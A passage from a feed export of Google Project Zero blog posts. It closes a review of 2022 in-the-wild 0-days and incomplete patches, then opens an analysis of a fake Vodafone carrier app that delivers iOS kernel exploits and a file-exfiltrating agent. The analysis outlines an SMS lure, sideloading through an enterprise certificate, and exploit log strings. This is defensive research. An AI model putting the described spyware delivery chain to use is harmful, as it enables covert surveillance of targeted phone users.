in-the-wild 0-days are due to the previous vulnerability not being fully patched. In the case of the Windows win32k and the Chromium property access interceptor bugs, the execution flow that the proof-of-concept exploits took were patched, but the root cause issue was not addressed: attackers were able to come back and trigger the original vulnerability through a different path. And in the case of the WebKit and Windows PetitPotam issues, the original vulnerability had previously been patched, but at some point regressed so that attackers could exploit the same vulnerability again. In the iOS IOMobileFrameBuffer bug, a buffer overflow was addressed by checking that a size was less than a certain number, but it didn&amp;rsquo;t check a minimum bound on that size. For more detailed explanations of three of the 0-days and how they relate to their variants, please see the &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://github.com/maddiestone/ConPresentations/blob/master/FIRST2022.2022_0days_so_far.pdf\"&gt;slides from the talk&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;When 0-day exploits are detected in-the-wild, it&amp;rsquo;s the failure case for an attacker. It&amp;rsquo;s a gift for us security defenders to learn as much as we can and take actions to ensure that that vector can&amp;rsquo;t be used again. The goal is to force attackers to start from scratch each time we detect one of their exploits: they&amp;rsquo;re forced to discover a whole new vulnerability, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. To do that effectively, we need correct and comprehensive fixes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;This is not to minimize the challenges faced by security teams responsible for responding to vulnerability reports. As we said in our 2020 year in review report: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c20\"&gt;&lt;span class=\"HZWKYxoXby-c12 HZWKYxoXby-c10\"&gt;Being able to correctly and comprehensively patch isn&amp;#39;t just flicking a switch: it requires investment, prioritization, and planning. It also requires developing a patching process that balances both protecting users quickly and ensuring it is comprehensive, which can at times be in tension. While we expect that none of this will come as a surprise to security teams in an organization, this analysis is a good reminder that there is still more work to be done. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c12 HZWKYxoXby-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c20\"&gt;&lt;span class=\"HZWKYxoXby-c10 HZWKYxoXby-c12\"&gt;Exactly what investments are likely required depends on each unique situation, but we see some common themes around staffing/resourcing, incentive structures, process maturity, automation/testing, release cadence, and partnerships.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;Practically, &lt;/span&gt;&lt;span&gt;some of the&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;following efforts can help ensure bugs are correctly and comprehensively fixed. Project Zero plans to continue to help with the following efforts, but we hope and encourage platform security teams and other independent security researchers to invest in these types of analyses as well:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c13 lst-kix_68660h7uawx-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c6 c18 li-bullet-0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Root cause analysis&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c16\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Understanding the underlying vulnerability that is being exploited. Also tries to understand how that vulnerability may have been introduced. Performing a root cause analysis can help ensure that a fix is addressing the underlying vulnerability and not just breaking the proof-of-concept. Root cause analysis is generally a pre-requisite for successful variant and patch analysis.&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c13 lst-kix_68660h7uawx-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c6 c18 li-bullet-0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Variant analysis&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c16\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Looking for other vulnerabilities similar to the reported vulnerability. This can involve looking for the same bug pattern elsewhere, more thoroughly auditing the component that contained the vulnerability, modifying fuzzers to understand why they didn&amp;rsquo;t find the vulnerability previously, etc. Most researchers find more than one vulnerability at the same time. By finding and fixing the related variants, attackers are not able to simply &amp;ldquo;plug and play&amp;rdquo; with a new vulnerability once the original is patched.&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c13 lst-kix_68660h7uawx-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c6 c18 li-bullet-0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Patch analysis&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c16\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Analyzing the proposed (or released) patch for completeness compared to the root cause vulnerability. I encourage vendors to share how they plan to address the vulnerability with the vulnerability reporter early so the reporter can analyze whether the patch comprehensively addresses the root cause of the vulnerability, alongside the vendor&amp;rsquo;s own internal analysis.&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c13 lst-kix_68660h7uawx-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c6 c18 li-bullet-0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Exploit technique analysis&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"HZWKYxoXby-c6 HZWKYxoXby-c16\"&gt;&lt;span&gt;Understanding the primitive gained from the vulnerability and how it&amp;rsquo;s being used. While it&amp;rsquo;s generally industry-standard to patch vulnerabilities, mitigating exploit techniques doesn&amp;rsquo;t happen as frequently. While not every exploit technique will always be able to be mitigated, the hope is that it will become the default rather than the exception. Exploit samples will need to be shared more readily in order for vendors and security researchers to be able to perform exploit technique analysis.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;Transparently sharing these analyses helps the industry as a whole as well. We publish our analyses at &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.github.io/0days-in-the-wild/rca.html\"&gt;this repository&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;. We encourage vendors and others to publish theirs as well. This allows developers and security professionals to better understand what the attackers already know about these bugs, which hopefully leads to even better solutions and security overall. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/256978548158816980/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/256978548158816980"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/256978548158816980"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html","@title":"2022 0-day In-the-Wild Exploitation…so far"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-5973748726134682294","published":"2022-06-23T09:01:00.002-07:00","updated":"2022-08-24T11:58:33.315-07:00","title":{"@type":"text","#text":"The curious tale of a fake Carrier.app"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6Ae_NZQ7StBcqH_vXVqoPMX0');ol{margin:0;padding:0}table td,table th{padding:0}.HovzfPYjjR-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.HovzfPYjjR-c34{padding-top:0pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;text-align:left}.HovzfPYjjR-c15{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.HovzfPYjjR-c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HovzfPYjjR-c31{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.HovzfPYjjR-c6{color:#000000;font-weight:400;font-size:11pt;font-family:\"Courier New\"}.HovzfPYjjR-c9{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.HovzfPYjjR-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.HovzfPYjjR-c30{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.HovzfPYjjR-c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.HovzfPYjjR-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.HovzfPYjjR-c14{font-size:10pt;font-family:Consolas,\"Courier New\";color:#3367d6;font-weight:400}.HovzfPYjjR-c16{color:#000000;font-weight:400;font-size:16pt;font-family:\"Arial\"}.HovzfPYjjR-c5{color:#000000;font-weight:400;font-size:11pt;font-family:\"Arial\"}.HovzfPYjjR-c27{color:#000000;font-weight:700;font-size:11pt;font-family:\"Arial\"}.HovzfPYjjR-c23{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:700}.HovzfPYjjR-c22{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.HovzfPYjjR-c1{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.HovzfPYjjR-c4{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.HovzfPYjjR-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.HovzfPYjjR-c21{color:#000000;font-weight:400;font-size:26pt;font-family:\"Arial\"}.HovzfPYjjR-c2{text-decoration:none;vertical-align:baseline;font-style:normal}.HovzfPYjjR-c33{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HovzfPYjjR-c32{margin-left:22.5pt;text-indent:36pt}.HovzfPYjjR-c19{color:inherit;text-decoration:inherit}.HovzfPYjjR-c26{font-weight:700;font-family:\"Courier New\"}.HovzfPYjjR-c7{font-weight:400;font-family:\"Courier New\"}.HovzfPYjjR-c28{text-decoration:none;vertical-align:baseline}.HovzfPYjjR-c8{orphans:2;widows:2}.HovzfPYjjR-c29{font-weight:700}.HovzfPYjjR-c18{height:0pt}.HovzfPYjjR-c25{font-style:italic}.HovzfPYjjR-c11{background-color:#00ff00}.HovzfPYjjR-c12{margin-right:-45pt}.HovzfPYjjR-c10{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;body class=\"HovzfPYjjR-c33\"&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c29\"&gt;NOTE: This issue was CVE-2021-30983 was fixed in iOS 15.2 in December 2021.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c2 HovzfPYjjR-c27\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Towards the end of 2021 Google's Threat Analysis Group (TAG) shared an iPhone app&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;with me:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s1874/Screenshot%202022-06-22%20at%2016.52.33.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"App splash screen showing the Vodafone carrier logo and the text My Vodafone.\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s1200/Screenshot%202022-06-22%20at%2016.52.33.png\" style=\"max-height: 750px; max-width: 600px;\" title=\"App splash screen showing the Vodafone carrier logo and the text My Vodafone.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;img /&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c24 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c25\"&gt;App splash screen showing the Vodafone carrier logo and the text \"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c25\"&gt;My Vodafone&lt;/span&gt;&lt;span class=\"c5 c28 c25\"&gt;\" (not the legitimate Vodadone app)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Although this looks like the real &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://apps.apple.com/gb/app/my-vodafone/id370901726\"&gt;My Vodafone carrier app&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;available in the App Store, it didn't come from the App Store and is not the real application from Vodafone. TAG suspects that a target receives a link to this app in an SMS, after the attacker asks the carrier to disable the target's mobile data connection. The SMS claims that in order to restore mobile data connectivity, the target must install the carrier app and includes a link to download and install this fake app.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;This sideloading works because the app is signed with an enterprise certificate, which can be purchased for $299 via the Apple &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://developer.apple.com/programs/enterprise/\"&gt;Enterprise developer program&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This program allows an eligible enterprise to obtain an Apple-signed &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;embedded.mobileprovision&lt;/span&gt;&lt;span&gt;&amp;nbsp;file with the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;ProvisionsAllDevices&lt;/span&gt;&lt;span&gt;&amp;nbsp;key set. An app signed with the developer certificate embedded within that &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;mobileprovision&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;file can be sideloaded on any iPhone, bypassing Apple's App Store review process. While we understand that the Enterprise developer program is designed for companies to push \"trusted apps\" to their staff's iOS devices, in this case, it appears that it was being used to sideload this fake carrier app.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;In collaboration with Project Zero, &lt;/span&gt;&lt;span&gt;&lt;a href=\"https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/\" target=\"_blank\"&gt;TAG has published an additional post with more details around the targeting and the actor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The rest of this blogpost is dedicated to the technical analysis of the app and the exploits contained therein.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.rengd0ayidhp\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;App structure&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The app is broken up into multiple frameworks. &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;InjectionKit.framework&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a generic privilege escalation exploit wrapper, exposing the primitives you'd expect (kernel memory access, entitlement injection, &lt;/span&gt;&lt;span&gt;amfid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;bypasses) as well as higher-level operations like app installation, file creation and so on.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;Agent.framework&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c2 HovzfPYjjR-c5\"&gt;&amp;nbsp;is partially obfuscated but, as the name suggests, seems to be a basic agent able to find and exfiltrate interesting files from the device like the Whatsapp messages database.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Six privilege escalation exploits are bundled with this app. Five are well-known, publicly available N-day exploits for older iOS versions. The sixth is not like those others at all.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;This blog post is the story of the last exploit and the month-long journey to understand it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.nr1ejtuvx4nm\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Something's missing? Or am I missing something?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Although all the exploits were different, five of them shared a common high-level structure. An initial phase where the kernel heap was manipulated to control object placement. Then the triggering of a kernel vulnerability followed by well-known steps to turn that into something useful, perhaps by disclosing kernel memory then building an arbitrary kernel memory write primitive.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The sixth exploit didn't have anything like that.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Perhaps it could be triggering a kernel logic bug like Linuz Henze's &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://github.com/LinusHenze/Fugu14\"&gt;Fugu14&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploit, or a very bad memory safety issue which gave fairly direct kernel memory access. But neither of those seemed very plausible either. &lt;/span&gt;&lt;span&gt;It looked, quite simply, like an iOS kernel exploit from a decade ago, except one which was first quite carefully checking that it was only running on an iPhone 12 or 13.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;It contained log messages like:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; printf(\"Failed to prepare fake vtable: 0x%08x\", ret);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;which seemed to happen far earlier than the exploit could possibly have defeated mitigations like K&lt;/span&gt;&lt;span&gt;ASLR&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;and PAC.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Shortly after that was this log message:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; printf(\"Waiting for R/W primitives...\");&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Why would you need to wait?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Then shortly after that:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;nbsp; printf(\"Memory read/write and callfunc primitives ready!\");&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Up to that point the exploit made only four &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;calls and there were no other obvious attempts at heap manipulation. But there was another log message which started to shed some light:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;&amp;nbsp; printf(\"Unexpected data read from DCP: 0x%08x\", v49);&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.dlybqvef2fq5\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;DCP?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;In October 2021 Adam Donenfeld tweeted this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 